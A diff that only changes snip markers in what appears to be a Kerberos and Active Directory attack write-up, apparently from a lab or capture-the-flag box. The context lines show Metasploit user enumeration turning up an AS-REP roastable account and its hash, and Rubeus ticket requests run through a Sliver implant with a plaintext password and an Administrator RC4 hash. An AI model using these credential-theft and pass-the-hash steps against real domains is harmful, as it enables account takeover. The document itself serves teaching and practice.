@@ -69,8 +69,8 @@ msf6 auxiliary(gather/kerberos_enumusers) > run
 [*] 172.16.2.1 - User: "user1" user not found
 [*] 172.16.2.1 - User: "user2" user not found
 [*] 172.16.2.1 - User: "user3" user not found
-[+] 172.16.2.1 - User: "user4" does not require preauthentication. Hash: $krb5asrep$23$ ...[SNIP]... 9161d63be1
-...[SNIP]...
+[+] 172.16.2.1 - User: "user4" does not require preauthentication. Hash: $krb5asrep$23$ ---[SNIP]--- 9161d63be1
+---[SNIP]---
 [*] Auxiliary module execution completed
 ```
 
@@ -94,7 +94,7 @@ jamesroberts
 james.roberts
 jamesrob
 jamerobe
-...[SNIP]...
+---[SNIP]---
 ```
 
 <small>*Ref: [username-anarchy](https://github.com/urbanadventurer/username-anarchy)*</small>
@@ -368,7 +368,7 @@ Valid starting     Expires            Service principal
 [+] TGT request successful!
 [*] base64(ticket.kirbi):
 
-      doIFpDCCBa ...[SNIP]... VURS5IVEI=
+      doIFpDCCBa ---[SNIP]--- VURS5IVEI=
 
 [+] Ticket successfully imported!
 
@@ -412,7 +412,7 @@ Valid starting     Expires            Service principal
 [+] TGT request successful!
 [*] base64(ticket.kirbi):
 
-      doIFpDCCBa ...[SNIP]... VURS5IVEI=
+      doIFpDCCBa ---[SNIP]--- VURS5IVEI=
 
 [+] Ticket successfully imported!
 
@@ -508,7 +508,7 @@ sliver (helloworld) > rubeus -- 'asktgt /user:m.lovegod /password:AbsoluteLDAP20
 [+] TGT request successful!
 [*] base64(ticket.kirbi):
 
-      doIFpDCCBa ...[SNIP]... VURS5IVEI=
+      doIFpDCCBa ---[SNIP]--- VURS5IVEI=
 
 [+] Ticket successfully imported!
 
@@ -554,7 +554,7 @@ sliver (helloworld) > rubeus -- 'asktgt /user:Administrator /rc4:1f4a6093623653f
 [+] TGT request successful!
 [*] base64(ticket.kirbi):
 
-      doIFpDCCBa ...[SNIP]... VURS5IVEI=
+      doIFpDCCBa ---[SNIP]--- VURS5IVEI=
       
 [+] Ticket successfully imported!
 
